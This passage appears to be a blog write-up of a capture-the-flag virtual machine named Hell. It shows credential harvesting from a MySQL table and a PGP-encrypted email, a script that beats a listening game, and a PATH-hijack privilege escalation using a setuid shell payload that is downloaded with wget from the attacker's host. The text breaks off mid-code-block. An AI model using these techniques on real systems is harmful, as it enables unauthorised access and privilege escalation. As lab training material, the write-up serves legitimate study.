</span><span class='line'>jTr/nFo0gKxBMgc34e9HNTI0iFlVYWDFZqU4ie6/Pyt8qvZHOe5Aq0qPsCkcdMME
</span><span class='line'>bR6EQng1ZBXX7zHCF2TobPnIxp5CGI2WUwXmXaGQS/hRriIcAhDx5ZFFqOdVQWES
</span><span class='line'>mLo5Rd205/M4mungbUvwrHayu6ZGume+VXs630YaacNiBFpXnPDfKOCipZ+EhYsz
</span><span class='line'>7febMxXj3mANwLXQfyTZOIXPzMptE11fbDA8jpy9m0vMy5ZCpJnp/VoTaaUxMz45
</span><span class='line'>OeUI9nKTx9P1lGPC9hYidshg3Sg5Iz/qqmL/byAv1bUV2YOdJlAS1XY9Jj/wNrYz
</span><span class='line'>yG9ASw5nfp0ChhLYnnU4dgfEk5bajGvgnhZAlb/+yNvJ5eUcwivjFC8jJUwlrZ+Z
</span><span class='line'>oj1XAC4148JsjcQHW1d7yONc4iI7tSubMNa5GfBal1BxMRLP3nSZ4ICl67gTjrKH
</span><span class='line'>ztiMKAefip3ywnRomfn7q9raJQ8TsKp0+REVy05mhZMZ1AdMlZzhTz8cYy8II6yr
</span><span class='line'>qSxuJARfJ95FGYPrASMfJ+aZfPNk5RDnH5d92vxm/nIWexdayZqqQJG4MzOhtrjx
</span><span class='line'>a0YouqQhxvD2aKslEBJ1S/D4D40xkVI+oaI+aM/6X+XzC2XVJgm7G8FvmtE09BUm
</span><span class='line'>fAMUxE/bgsv33QXsURtelfuoZRLz/OmwybXpwv+Zen0n8hpjQEAOhqD4eieIxH9j
</span><span class='line'>7W6ijInh9XD8jcnUa4eHw7WDa0LPtyQSbPZB1hZou6z8pAZY0LxhmstpPjSYfdKR
</span><span class='line'>HRjhRuu0tdZ2PrKx1wKooo/iiJdZ0Cgizlu4k76rDrQSamFja0Bjb3dsb3ZlcnMu
</span><span class='line'>Y29tiQEcBBABAgAGBQJToPb/AAoJEL26wSU/GKsKnk0H/iWvOGuWwge8VteqxPip
</span><span class='line'>yu2LwvLzjbHAeWwBmsg69h+Yl5l8Y+3B9aoCpnjM2QmMAFHxVA8L6Z4UIyhNJ90Y
</span><span class='line'>l18rYZec9cDUrflowd/A4QVrJNCV/5kCyPeQ03mzGHnlTTvb/qBMymmpVBeP3JoK
</span><span class='line'>vZkGYzFBmrt7q19b3VcvexLTwtLtch8NUOt6719UFRvxE+EXu4JbItr7dSqfYDbh
</span><span class='line'>zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa
</span><span class='line'>quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo
</span><span class='line'>tqg=
</span><span class='line'>=SCkw
</span><span class='line'>-----END PGP PRIVATE KEY BLOCK-----
</span><span class='line'>$
</span></code></pre></td></tr></table></div></figure>


<p>After poking around, I found <code>.pgp</code> hidden folder which include PGP private key and public key in jack&rsquo;s home directory, take a note and will be used later.</p>

<h2>Moving to <em>milk_4_life</em></h2>

<p>Then I was trying to login to MYSQL database and found jack&rsquo;s web admin password is <em><font color="red">g0tmi1k69</font></em></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>$ mysql -uwww-data -p
</span><span class='line'>Enter password:
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 37
</span><span class='line'>Server version: 5.5.37-0+wheezy1 (Debian)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; show databases;
</span><span class='line'>+--------------------+
</span><span class='line'>| Database           |
</span><span class='line'>+--------------------+
</span><span class='line'>| information_schema |
</span><span class='line'>| website            |
</span><span class='line'>+--------------------+
</span><span class='line'>2 rows in set (0.01 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; use website
</span><span class='line'>Reading table information for completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Database changed
</span><span class='line'>mysql&gt; show tables;
</span><span class='line'>+-------------------+
</span><span class='line'>| Tables_in_website |
</span><span class='line'>+-------------------+
</span><span class='line'>| users             |
</span><span class='line'>+-------------------+
</span><span class='line'>1 row in set (0.00 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; select * from users;
</span><span class='line'>+----------+-----------+
</span><span class='line'>| username | password  |
</span><span class='line'>+----------+-----------+
</span><span class='line'>| Jack     | g0tmi1k69 |
</span><span class='line'>+----------+-----------+
</span><span class='line'>1 row in set (0.00 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Then I found there is an email for jack but it is encrypted by PGP, so I need using pgp private key (which is found before) to decrypt the message. Here is a handy <code>gpg</code> help <a href="http://irtfweb.ifa.hawaii.edu/~lockhart/gpg/gpg-cs.html">guide</a>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls -alh /var/mail
</span><span class='line'>total 16K
</span><span class='line'>drwxrwsr-x  4 root   mail   4.0K Jul 15 09:25 .
</span><span class='line'>drwxr-xr-x 12 root   root   4.0K Jun 17  2014 ..
</span><span class='line'>drwxr-sr-x  2 george george 4.0K Jun 20  2014 george
</span><span class='line'>drwxr-sr-x  3 jack   jack   4.0K Jul  5  2014 jack
</span><span class='line'>$ ls -alh /var/mail/jack
</span><span class='line'>total 12K
</span><span class='line'>drwxr-sr-x 3 jack jack 4.0K Jul  5  2014 .
</span><span class='line'>drwxrwsr-x 4 root mail 4.0K Jul 15 09:25 ..
</span><span class='line'>drwxr-sr-x 2 root mail 4.0K Jun 18  2014 received
</span><span class='line'>$ ls -alh /var/mail/jack/received
</span><span class='line'>total 12K
</span><span class='line'>drwxr-sr-x 2 root mail 4.0K Jun 18  2014 .
</span><span class='line'>drwxr-sr-x 3 jack jack 4.0K Jul  5  2014 ..
</span><span class='line'>-rw-r--r-- 1 root mail  709 Jun 18  2014 message.eml
</span><span class='line'>$ cat /var/mail/jack/received/message.eml
</span><span class='line'>-----BEGIN PGP MESSAGE-----
</span><span class='line'>Version: BCPG C# v1.6.1.0
</span><span class='line'>
</span><span class='line'>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
</span><span class='line'>yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
</span><span class='line'>3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
</span><span class='line'>7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
</span><span class='line'>rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
</span><span class='line'>MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
</span><span class='line'>9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
</span><span class='line'>V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
</span><span class='line'>svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
</span><span class='line'>+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
</span><span class='line'>=svWU
</span><span class='line'>-----END PGP MESSAGE-----
</span><span class='line'>$ gpg --allow-secret-key-import --import .pgp/pgp.priv
</span><span class='line'>gpg: key 3F18AB0A: secret key imported
</span><span class='line'>gpg: key 3F18AB0A: "jack@cowlovers.com" not changed
</span><span class='line'>gpg: Total number processed: 1
</span><span class='line'>gpg:              unchanged: 1
</span><span class='line'>gpg:       secret keys read: 1
</span><span class='line'>gpg:   secret keys imported: 1
</span><span class='line'>$ gpg /var/mail/jack/received/message.eml
</span><span class='line'>
</span><span class='line'>You need a passphrase to unlock the secret key for
</span><span class='line'>user: "jack@cowlovers.com"
</span><span class='line'>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
</span><span class='line'>
</span><span class='line'>gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
</span><span class='line'>gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
</span><span class='line'>      "jack@cowlovers.com"
</span><span class='line'>gpg: /var/mail/jack/received/message.eml: unknown suffix
</span><span class='line'>Enter new filename [text.txt]: 
</span><span class='line'>gpg: WARNING: message was not integrity protected
</span><span class='line'>$ cat text.txt
</span><span class='line'>Ok Jack. I've created the account 'milk_4_life' as per your request. Please stop emailing me about this now or I'm going to talk to HR like we discussed. 
</span><span class='line'>
</span><span class='line'>The password is '4J0WWvL5nS'
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Here we got user <code>milk_4_life</code> has password: <em><font color="red">4J0WWvL5nS</font></em></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ssh milk_4_life@localhost
</span><span class='line'>The authenticity of host 'localhost (::1)' can't be established.
</span><span class='line'>ECDSA key fingerprint is e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
</span><span class='line'>milk_4_life@localhost's password: 
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Jul 12 07:02:03 2015 from 10.10.10.131
</span><span class='line'>$ id
</span><span class='line'>uid=1002(milk_4_life) gid=1002(milk_4_life) groups=1002(milk_4_life)
</span><span class='line'>$ pwd
</span><span class='line'>/home/milk_4_life
</span><span class='line'>$ ls -l
</span><span class='line'>total 12
</span><span class='line'>---s--x--x 1 george      george      5743 Jun 19  2014 game
</span><span class='line'>-rwxr-xr-x 1 milk_4_life milk_4_life  473 Jul 11 20:36 win.py
</span><span class='line'>$ ls -alh
</span><span class='line'>total 36K
</span><span class='line'>drwx------ 2 milk_4_life milk_4_life 4.0K Jul 12 06:59 .
</span><span class='line'>drwxr-xr-x 7 root        root        4.0K Jul  5  2014 ..
</span><span class='line'>-rw------- 1 milk_4_life milk_4_life   51 Jul 12 07:24 .bash_history
</span><span class='line'>-rwx------ 1 milk_4_life milk_4_life    1 Jun 22  2014 .bash_logout
</span><span class='line'>-rwx------ 1 milk_4_life milk_4_life 3.4K Jan  1  2013 .bashrc
</span><span class='line'>---s--x--x 1 george      george      5.7K Jun 19  2014 game
</span><span class='line'>-rwx------ 1 milk_4_life milk_4_life  675 Jan  1  2013 .profile</span></code></pre></td></tr></table></div></figure>


<h2>Moving to <em>george</em></h2>

<p>Here we can see that there is program <code>game</code> which is owned by george and sticky bit has been set. That means this program has high possibility to be exploited for privilege escaping to george.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ss -lnt
</span><span class='line'>State      Recv-Q Send-Q                                               Local Address:Port                                                 Peer Address:Port 
</span><span class='line'>LISTEN     0      50                                                       127.0.0.1:3306                                                            *:*     
</span><span class='line'>LISTEN     0      128                                                              *:57356                                                           *:*     
</span><span class='line'>LISTEN     0      128                                                             :::111                                                            :::*     
</span><span class='line'>LISTEN     0      128                                                              *:111                                                             *:*     
</span><span class='line'>LISTEN     0      128                                                             :::80                                                             :::*     
</span><span class='line'>LISTEN     0      128                                                             :::59635                                                          :::*     
</span><span class='line'>LISTEN     0      128                                                             :::22                                                             :::*     
</span><span class='line'>LISTEN     0      128                                                              *:22                                                              *:*     
</span><span class='line'>LISTEN     0      20                                                             ::1:25                                                             :::*     
</span><span class='line'>LISTEN     0      20                                                       127.0.0.1:25                                                              *:*     
</span><span class='line'>LISTEN     0      10                                                               *:666                                                             *:*     
</span><span class='line'>$ ./game &
</span><span class='line'>$ I'm listening
</span><span class='line'>
</span><span class='line'>$ ss -lnt
</span><span class='line'>State      Recv-Q Send-Q                                               Local Address:Port                                                 Peer Address:Port 
</span><span class='line'>LISTEN     0      50                                                       127.0.0.1:3306                                                            *:*     
</span><span class='line'>LISTEN     0      128                                                              *:57356                                                           *:*     
</span><span class='line'>LISTEN     0      128                                                             :::111                                                            :::*     
</span><span class='line'>LISTEN     0      128                                                              *:111                                                             *:*     
</span><span class='line'>LISTEN     0      128                                                             :::80                                                             :::*     
</span><span class='line'>LISTEN     0      128                                                             :::59635                                                          :::*     
</span><span class='line'>LISTEN     0      128                                                             :::22                                                             :::*     
</span><span class='line'>LISTEN     0      128                                                              *:22                                                              *:*     
</span><span class='line'>LISTEN     0      10                                                               *:1337                                                            *:*     
</span><span class='line'>LISTEN     0      20                                                             ::1:25                                                             :::*     
</span><span class='line'>LISTEN     0      20                                                       127.0.0.1:25                                                              *:*     
</span><span class='line'>LISTEN     0      10                                                               *:666                                                             *:*     
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>After I run the game program and check listening ports, I found game is listening on port <em>1337</em>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ telnet 127.0.0.1 1337
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is '^]'.
</span><span class='line'>Type 'START' to begin
</span><span class='line'>
</span><span class='line'>START 
</span><span class='line'>Starting...
</span><span class='line'>
</span><span class='line'>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)
</span><span class='line'>
</span><span class='line'>Quick what's... 769 x 49? 48
</span><span class='line'>Quick what's... 413 x 17? 15
</span><span class='line'>Quick what's... 779 x 106? 45
</span><span class='line'>Quick what's... 439 x 803? 55
</span><span class='line'>Quick what's... 555 x 341? 821
</span><span class='line'>Quick what's... 976 x 1? 
</span><span class='line'>Lol nope
</span><span class='line'>
</span><span class='line'>Final Score: 0
</span><span class='line'>
</span><span class='line'>Connection closed by foreign host.
</span><span class='line'>[1] + Done                       ./game
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>In order to win the game, I wrote a python script to calculate and send the result back to program.</p>

<figure class='code'><figcaption><span>my_win.py  (my_win.py)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/my_win.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;127.0.0.1&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;START/n&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>  <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&quot;Quick what&#39;s\.\.\. (.*)\?&quot;</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&quot;pattern is not found!&quot;</span>
</span><span class='line'>      <span class="k">print</span> <span class="n">res</span>
</span><span class='line'>      <span class="k">break</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; x &#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">rst</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>      <span class="k">print</span> <span class="n">rst</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rst</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Done!&#39;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>After running the script and win the game, something new appeared <code>I hear the faint sound of chmodding........</code>. That sounds like command <code>chmod</code> has been called after win the game.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Hell1/4.png"></p>

<p>Now I decided to check if the command <code>chmod</code> is called from absolute path or not. I upload setuid.c to target server&rsquo;s temporary directory <code>/tmp/</code>, compile it and change the name to <code>chmod</code>.</p>

<figure class='code'><figcaption><span>setuid.c  (setuid.c)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/setuid.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ wget http://10.10.10.131/setuid.c
</span><span class='line'>--2015-07-16 08:49:24--  http://10.10.10.131/setuid.c
</span><span class='line'>Connecting to 10.10.10.131:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 122 [text/x-csrc]
</span><span class='line'>Saving to: `setuid.c'
</span><span class='line'>
</span><span class='line'>100%[======================================>] 122         --.-K/s   in 0s      
</span><span class='line'>
</span><span class='line'>2015-07-16 08:49:24 (14.9 MB/s) - `setuid.c' saved [122/122]
</span><span class='line'>
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw-r--r-- 1 milk_4_life milk_4_life 122 Jul 15 22:47 setuid.c
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Next I add <code>/tmp</code> to the beginning of the environmental PATH variable. Then I play the game and run python script to win.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ printenv PATH
</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>$ export PATH=/tmp:$PATH
</span><span class='line'>$ printenv PATH
</span><span class='line'>/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>$ ./game
</span><span class='line'>I'm listening
</span><span class='line'>$ whoami
</span><span class='line'>george
</span><span class='line'>$ id
</span><span class='line'>uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Bingo! I am <code>george</code> now. After poking around in the file system, I found <code>container.tc</code> file (which is a Truecrypt encrypted file) in george&rsquo;s home directory. Also george has an email which shows a clue to crack the encrypted file by using rockyou password dictionary.</p>

<h2>Moving to <em>bazza</em></h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
